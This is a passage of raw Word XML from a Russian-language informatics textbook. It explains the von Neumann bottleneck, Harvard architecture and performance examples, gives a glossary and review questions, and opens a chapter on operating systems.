        <w:br/>
        <w:t>1004: ADD R1, 5             ; Прибавить к R1 число 5</w:t>
        <w:br/>
        <w:t>1008: STORE [0x2000], R1    ; Сохранить R1 обратно в память</w:t>
        <w:br/>
        <w:t>100C: JUMP 0x1020           ; Перейти к команде по адресу 0x1020 (условный переход)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>После выполнения `JUMP` счётчик команд становится PC = 0x1020, и выполнение продолжается оттуда.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Узкое место фон Неймана (Von Neumann Bottleneck)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Принципы фон Неймана гениальны, но у них есть фундаментальная проблема: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>процессор и память разделены</w:t>
      </w:r>
      <w:r>
        <w:t>. Процессор должен постоянно обращаться к памяти за командами и данными, а память работает в сотни раз медленнее процессора.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> представь, что ты собираешь IKEA-мебель. Инструкция (программа) и детали (данные) лежат в другой комнате. Ты каждый раз бегаешь туда-сюда: прочитал инструкцию → принёс деталь → собрал → побежал за следующей. Большую часть времени ты тратишь не на сборку, а на беготню.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема в цифрах:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Современный процессор (Intel Core i7): частота 4 GHz, выполняет одну операцию за ~0.25 наносекунды.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оперативная память (DDR5): задержка (latency) ~10-20 наносекунд.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Разрыв в скорости: 40-80 раз.**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решения (частичные):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Кэш-память** (Cache):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Маленькая, но **очень быстрая** память внутри процессора.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хранит копии часто используемых данных.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Три уровня: L1 (~1 нс), L2 (~4 нс), L3 (~10 нс).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: Intel Core i9 имеет 2 MB кэша L1, 16 MB L2, 36 MB L3.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Конвейеризация** (Pipelining):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Процессор начинает выполнять следующую команду, не дожидаясь окончания предыдущей.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Как конвейер на заводе: пока одна деталь собирается, следующая уже готовится.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Параллелизм**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Многоядерные процессоры: несколько команд выполняются одновременно на разных ядрах.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>SIMD (Single Instruction, Multiple Data): одна команда обрабатывает сразу много данных (например, SSE, AVX в x86).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Предсказание переходов** (Branch Prediction):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Процессор пытается угадать, какая команда будет выполнена следующей (при условных переходах), и заранее загружает её.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Точность современных предсказателей: ~95%.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Гарвардская архитектура**:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Разделение памяти для команд и данных (как в старых микроконтроллерах).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Процессор может одновременно читать команду и обращаться к данным.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Но полностью решить проблему нельзя.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Узкое место фон Неймана — это фундаментальное ограничение архитектуры. Поэтому индустрия ищет альтернативы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Квантовые компьютеры** (работают на принципах квантовой механики).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Нейроморфные процессоры** (имитируют работу мозга, например, IBM TrueNorth).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**In-memory computing** (вычисления прямо в памяти, без передачи данных процессору).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.3.3. Гарвардская архитектура</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Гарвардская архитектура</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — альтернатива архитектуре фон Неймана. Названа в честь компьютера </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Harvard Mark I</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (1944), который использовал перфоленты для программы и механические регистры для данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ключевое отличие:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> память для программ и память для данных физически разделены. Два независимых адресных пространства, две шины (buses).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Преимущества:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Скорость:** процессор может одновременно читать команду из памяти программ и данные из памяти данных. Нет конфликта за доступ к памяти.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Защита кода:** программа не может случайно (или намеренно) перезаписать саму себя. Вирусам сложнее модифицировать код.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Недостатки:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Жёсткое разделение:** если память программ кончилась, а память данных пустует — использовать её нельзя.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сложность:** нужно две отдельных памяти, две шины, более сложная разводка на плате.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Где используется:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Микроконтроллеры**: AVR (Arduino), PIC, ARM Cortex-M.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Цифровые сигнальные процессоры** (DSP) для обработки звука и видео.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модифицированная гарвардская архитектура:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> в современных процессорах используют гибрид. Логически память единая (как у фон Неймана), но на уровне кэша L1 она разделена на кэш команд (I-cache) и кэш данных (D-cache). Это даёт преимущество гарвардской архитектуры (параллельный доступ) без её недостатков.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.3.4. Связь с другими главами</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 2.1 (Архитектура ЭВМ):** принципы фон Неймана — это основа архитектуры любого компьютера. Компоненты (CPU, память, шины), которые мы разобрали, работают именно по этим принципам.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 2.2 (История ЭВМ):** ENIAC был ещё до фон Неймана — программировался перестановкой проводов. EDVAC (1949) стал первым компьютером с архитектурой фон Неймана.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Главы раздела 3 (Программные средства):** операционные системы и программы возможны благодаря принципу "программа в памяти".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры для понимания</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Сравнение производительности</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> сравнить производительность суперкомпьютера Frontier, игрового ПК и смартфона.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Устройство                | Производительность (TFLOPS) | Во сколько раз мощнее ПК |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---------------------------|----------------------------|-------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Frontier (суперкомпьютер)  | 1,100,000                  | 110,000×                |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| Игровой ПК (RTX 4090)      | 10                         | 1×                      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| iPhone 15 Pro (GPU)        | 2.5                        | 0.25×                   |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Frontier мощнее твоего игрового ПК в 110,000 раз. Но стоит он $600 млн, а твой ПК — $2000. Эффективность затрат: ПК выигрывает.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Узкое место фон Неймана</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> процессор Intel Core i7-13700K (частота 5.4 GHz) выполняет программу сложения двух массивов по 1 миллиону элементов. Каждый элемент — 4 байта (integer).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Расчёт без кэша:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Чтобы сложить два числа, нужно: прочитать первое число (20 нс), прочитать второе (20 нс), сложить (0.2 нс), записать результат (20 нс). Итого: **60.2 нс** на одно сложение.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для миллиона элементов: 60.2 нс × 10⁶ = **60.2 миллисекунды**.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Расчёт с кэшем L1:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если данные в кэше L1 (латентность 1 нс): чтение-чтение-сложение-запись = 3.2 нс.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для миллиона элементов: **3.2 миллисекунды** (в 18 раз быстрее).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 99% времени процессор ждёт память, а не считает. Кэш решает проблему частично, но не полностью.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Встраиваемая система</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> микроконтроллер Arduino Uno (ATmega328P: 16 MHz, 2 KB ОЗУ) управляет светодиодной лентой из 60 светодиодов. Каждый светодиод требует 3 байта данных (RGB). Сколько кадров в секунду (FPS) можно вывести?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Объём данных на один кадр: 60 LEDs × 3 байта = 180 байт.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скорость передачи данных по протоколу WS2812 (светодиодная лента): 800 кГц = 100 KB/с.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Время на один кадр: 180 байт / (100 KB/с) = 1.8 мс.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>FPS: 1000 мс / 1.8 мс = **555 FPS**.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Arduino (древний камень 2009 года) справляется с анимацией LED-ленты на 555 кадрах в секунду. Для встраиваемых задач не нужна огромная мощность — нужна правильная архитектура.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Ключевые термины и определения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Суперкомпьютер** — компьютер с максимальной производительностью (петафлопсы), используется для сложных научных расчётов.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Петафлопс (PFLOPS)** — 10¹⁵ операций с плавающей точкой в секунду.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Мейнфрейм** — высоконадёжный корпоративный сервер для критически важных задач (банки, авиакомпании).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сервер** — компьютер, который обслуживает запросы других компьютеров (клиентов).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Рабочая станция (Workstation)** — мощный ПК для профессиональных задач (3D, видео, САПР).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Встраиваемая система (Embedded System)** — компьютер, встроенный в устройство для выполнения специализированной задачи.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Микроконтроллер (MCU)** — микросхема, содержащая процессор, память и периферию на одном чипе (Arduino, ESP32).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Принципы фон Неймана** — пять принципов построения компьютера: двоичная система, программное управление, однородность памяти, адресность, последовательное выполнение.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Узкое место фон Неймана (Von Neumann Bottleneck)** — ограничение производительности из-за разделения процессора и памяти.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Гарвардская архитектура** — архитектура с раздельной памятью для команд и данных (используется в микроконтроллерах).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Кэш-память (Cache)** — быстрая память внутри процессора для хранения часто используемых данных (L1, L2, L3).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Счётчик команд (Program Counter, PC)** — регистр процессора, указывающий на адрес следующей команды.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SoC (System-on-Chip)** — система на одном чипе (процессор + GPU + модем + контроллеры), используется в смартфонах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Контрольные вопросы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Теория:** Назовите пять принципов архитектуры фон Неймана. Объясните, почему принцип "однородности памяти" позволяет программе изменять саму себя, но создаёт угрозу безопасности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Практика:** Суперкомпьютер Frontier имеет производительность 1.1 экзафлопса (1.1 × 10¹⁸ FLOPS). Игровой ПК с видеокартой RTX 4090 — 10 терафлопс (10 × 10¹² FLOPS). Сколько таких ПК нужно, чтобы достичь мощности Frontier? Реалистично ли объединить их в кластер? (Подсказка: подумайте об энергопотреблении и охлаждении.)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сравнение:** В чём принципиальное отличие гарвардской архитектуры от архитектуры фон Неймана? Почему микроконтроллеры (Arduino) используют гарвардскую архитектуру, а процессоры ПК — фон Неймана (с элементами гарвардской на уровне кэша)?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Анализ:** Объясните проблему "узкого места фон Неймана". Процессор Intel Core i9 выполняет 5 миллиардов операций в секунду, но обращение к оперативной памяти занимает 20 наносекунд. Сколько времени процессор потратит на ожидание памяти, если программа выполняет 1 миллион операций, каждая из которых требует одного обращения к памяти? Сравните с временем на сами вычисления (0.2 нс на операцию).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Классификация:** Почему мейнфреймы до сих пор используются в банках, хотя их производительность ниже, чем у современных серверов? Что важнее для банковской системы: скорость или надёжность? Приведите пример последствий отказа системы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Итог:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Теперь ты знаешь, что компьютеры бывают размером с дата-центр (Frontier) и размером с ноготь (ESP32), но все они работают по принципам, которые придумали 80 лет назад. Принципы фон Неймана — это основа всей современной вычислительной техники, но у них есть фундаментальное ограничение (узкое место), которое никто не может решить уже 70 лет. Поэтому индустрия изобретает костыли (кэш, конвейеризация, многоядерность) и ищет альтернативы (квантовые компьютеры, нейроморфные чипы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Следующая глава (3.1) — операционные системы: как заставить всё это железо что-то полезное делать.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 3.1: Операционные системы. Назначение и классификация</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Итак, в разделе 2 мы разобрались, что железо бывает разное: от суперкомпьютера за полмиллиарда долларов до Arduino за 500 рублей. Все эти железки работают по принципам фон Неймана (глава 2.3), но сами по себе они бесполезны. Процессор без программы — это просто кусок кремния, который потребляет электричество и греется.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Чтобы заставить компьютер что-то делать, нужна </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>операционная система</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (ОС). Это посредник между железом и всеми твоими программами. Без ОС тебе пришлось бы писать код, который напрямую управляет процессором, памятью, жёсткими дисками, сетевыми картами — в общем, полный ад. ОС делает всю грязную работу за тебя.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В этой главе разберём: что такое ОС, зачем она нужна, какие бывают, и почему Linux-фанаты всегда пытаются тебя переубедить поставить Arch (не ставь, если ценишь своё время).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1.1. Что такое операционная система?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Операционная система (ОС, Operating System, OS)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это комплекс программ, которые управляют аппаратными ресурсами компьютера и предоставляют сервисы для пользовательских приложений.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> представь, что компьютер — это ресторан. Процессор — повар, память — холодильник, диск — кладовая, клавиатура с мышкой — посетители. ОС — это менеджер ресторана, который:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Принимает заказы от посетителей (программ).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Распределяет работу повара (планирование процессов).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Следит, чтобы продукты не протухли в холодильнике (управление памятью).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Заказывает новые продукты со склада (управление дисками).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не даёт одному посетителю съесть заказ другого (защита памяти).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Без менеджера ресторан превратится в хаос. Так же и с компьютером.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Функции операционной системы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>ОС выполняет кучу задач, но основные можно разделить на пять категорий:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Управление процессами (Process Management)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Процесс</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это программа в процессе выполнения. Открыл браузер — запустился процесс. Открыл ещё 20 вкладок — запустилось ещё 20 процессов (Chrome, привет).</w:t>
      </w:r>
    </w:p>
    <w:p/>
